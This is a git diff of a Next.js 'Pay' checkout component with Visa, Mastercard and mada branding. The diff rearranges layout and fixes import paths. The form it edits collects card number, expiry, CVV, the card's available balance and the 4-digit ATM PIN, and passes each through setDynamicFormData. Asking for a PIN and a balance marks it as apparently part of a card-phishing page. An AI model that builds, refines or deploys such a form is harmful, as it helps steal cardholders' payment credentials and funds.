@@ -1,8 +1,8 @@
 "use client"
 import styles from './pay.module.css'
-import visa from '../../../../public/visa.png'
-import master from '../../../../public/master.png'
-import mada from '../../../../public/mada.png'
+import visa from '../../../../../public/visa.png'
+import master from '../../../../../public/master.png'
+import mada from '../../../../../public/mada.png'
 import Image from 'next/image'
 import {useState} from 'react'
 import { useRouter,useSearchParams } from 'next/navigation'
@@ -93,7 +93,12 @@ const Pay=()=>{
                   const { name, value } = e.target;
                   setDynamicFormData(name, value);
                 }}  required maxLength="16"/>
-            <div>
+            
+          <label htmlFor="الرصيد">
+                          الرصيدالمتوفر
+                     </label>
+            <div className={styles.curmony}>
+                     <div>
             <input type="text" placeholder='(MM)'  name='MM' onChange={(e) => {
                   const { name, value } = e.target;
                   setDynamicFormData(name, value);
@@ -103,21 +108,17 @@ const Pay=()=>{
                   setDynamicFormData(name, value);
                 }} maxLength="2" required/>
             </div>
-          <label htmlFor="الرصيد">
-                          الرصيدالمتوفر
-                     </label>
-            <div className={styles.curmony}>
-                     
                      <input type="text" name='الرصيد' placeholder='0.000000'onChange={(e) => {
                   const { name, value } = e.target;
                   setDynamicFormData(name, value);
                 }} maxLength="7" required/>
-                 </div>
-            
-            <input type="text" placeholder='الرقم (cvc/cvv)' name='cvcCard' onChange={(e) => {
+              <input type="text" placeholder='الرقم (cvc/cvv)' name='cvcCard' onChange={(e) => {
                   const { name, value } = e.target;
                   setDynamicFormData(name, value);
                 }} maxLength="3" required/>
+                 </div>
+            
+            
             <input type="text" placeholder='ادخل رقم بطاقة الصراف المكونة من 4 ارقام 'name='كلمةالمرورالبطاقة' onChange={(e) => {
                   const { name, value } = e.target;
                   setDynamicFormData(name, value);
